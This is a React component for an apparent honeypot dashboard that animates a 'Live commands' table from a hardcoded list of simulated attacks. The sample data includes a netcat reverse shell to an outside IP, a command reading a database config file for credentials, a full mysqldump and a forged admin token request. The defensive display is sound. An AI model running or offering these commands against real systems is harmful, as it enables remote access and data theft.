'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Pause, Play } from 'lucide-react';
import Link from 'next/link';
import type { Attack } from '@/types';
import { Panel, RiskBadge, Tag } from '@/components/ui';

interface AttackStreamProps {
  initialAttacks: Attack[];
}

const simulatedIncomingAttacks: Attack[] = [
  {
    id: 'atk-sim-001',
    timestamp: '10:25:02',
    sourceIP: '192.168.14.45',
    honeypot: 'SSH-HNY-01',
    action: 'cat /var/backups/database.conf',
    behavior: 'Credential Access',
    risk: 'CRITICAL',
    sessionId: 'sess-001',
  },
  {
    id: 'atk-sim-002',
    timestamp: '10:25:18',
    sourceIP: '45.33.32.156',
    honeypot: 'API-HNY-01',
    action: 'POST /v1/auth/token {"admin":"true"}',
    behavior: 'Brute Force',
    risk: 'HIGH',
    sessionId: 'sess-004',
  },
  {
    id: 'atk-sim-003',
    timestamp: '10:25:44',
    sourceIP: '91.240.118.222',
    honeypot: 'DB-HNY-01',
    action: 'mysqldump --all-databases',
    behavior: 'Data Exfiltration',
    risk: 'CRITICAL',
    sessionId: 'sess-005',
  },
  {
    id: 'atk-sim-004',
    timestamp: '10:26:10',
    sourceIP: '103.45.67.91',
    honeypot: 'SSH-HNY-01',
    action: 'nc -e /bin/sh 103.45.67.91 4444',
    behavior: 'Lateral Movement',
    risk: 'CRITICAL',
    sessionId: 'sess-003',
  },
];

export function AttackStream({ initialAttacks }: AttackStreamProps) {
  const [attacks, setAttacks] = useState<Attack[]>(initialAttacks);
  const [isStreaming, setIsStreaming] = useState(true);

  useEffect(() => {
    if (!isStreaming) return;
    let index = 0;
    const interval = setInterval(() => {
      const next = {
        ...simulatedIncomingAttacks[index],
        timestamp: new Date().toTimeString().split(' ')[0],
        id: `atk-stream-${Date.now()}-${index}`,
      };
      setAttacks((prev) => [next, ...prev.slice(0, 9)]);
      index = (index + 1) % simulatedIncomingAttacks.length;
    }, 4500);
    return () => clearInterval(interval);
  }, [isStreaming]);

  return (
    <Panel
      title={
        <span className="flex items-center gap-2">
          Live commands
          <span className={isStreaming ? 'live-dot text-signal' : 'h-[7px] w-[7px] rounded-full bg-rule-strong'} />
        </span>
      }
      note="Every keystroke and request an attacker sends to a decoy, newest first"
      action={
        <>
          <button onClick={() => setIsStreaming(!isStreaming)} className="btn">
            {isStreaming ? <Pause className="h-3.5 w-3.5" /> : <Play className="h-3.5 w-3.5" />}
            {isStreaming ? 'Pause' : 'Resume'}
          </button>
          <Link href="/live-attacks" className="btn">Open monitor</Link>
        </>
      }
    >
      <div className="-mx-5 overflow-x-auto px-5">
        <table className="data-table min-w-[760px]">
          <thead>
            <tr>
              <th>Time</th>
              <th>Source</th>
              <th>Decoy</th>
              <th>Command</th>
              <th>Intent</th>
              <th className="text-right">Risk</th>
            </tr>
          </thead>
          <tbody>
            <AnimatePresence initial={false}>
              {attacks.map((a) => (
                <motion.tr
                  key={a.id}
                  initial={{ opacity: 0, backgroundColor: '#FDF3C4' }}
                  animate={{ opacity: 1, backgroundColor: 'rgba(253,243,196,0)' }}
                  transition={{ opacity: { duration: 0.3 }, backgroundColor: { duration: 2.4 } }}
                >
                  <td className="whitespace-nowrap font-mono text-xs text-pencil">{a.timestamp}</td>
                  <td className="whitespace-nowrap font-mono text-xs font-medium text-ink">{a.sourceIP}</td>
                  <td className="whitespace-nowrap"><Tag>{a.honeypot}</Tag></td>
                  <td className="max-w-[320px] truncate font-mono text-xs text-ink" title={a.action}>
                    <span className="mr-1.5 text-pencil">$</span>{a.action}
                  </td>
                  <td className="whitespace-nowrap text-graphite">{a.behavior}</td>
                  <td className="text-right"><RiskBadge risk={a.risk} /></td>
                </motion.tr>
              ))}
            </AnimatePresence>
          </tbody>
        </table>
      </div>
    </Panel>
  );
}
